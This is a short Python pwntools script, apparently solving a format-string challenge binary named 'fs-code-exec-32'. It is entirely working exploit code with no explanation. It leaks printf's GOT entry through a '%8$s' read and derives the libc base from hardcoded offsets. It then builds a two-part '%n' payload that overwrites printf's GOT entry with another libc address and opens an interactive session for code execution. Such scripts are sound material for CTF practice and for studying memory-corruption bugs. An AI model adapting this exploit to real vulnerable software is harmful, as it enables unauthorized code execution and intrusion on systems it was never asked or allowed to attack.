from pwn import *
p = process("./fs-code-exec-32")

got_printf = p.elf.got['printf']

p.sendline( "%8$s"+ p32(got_printf))
p.recvuntil("llo ")
target_num = p.recvline()

target_num = u32(target_num[:4])

libcbase = target_num - 0x49670

target_num = libcbase + 0x3ada0

target_addr = got_printf

front = target_num & 0xffff
front = front - 8

back = (target_num >>16) - (front+8)
while back < 0:
    back += 0x10000

payload = p32(target_addr) + p32(target_addr+2)
payload = payload + "%" + "%05d" % front + "x%7$n"
payload = payload + "%" + "%05d" % back + "x%8$n"

p.sendline(payload)

p.interactive()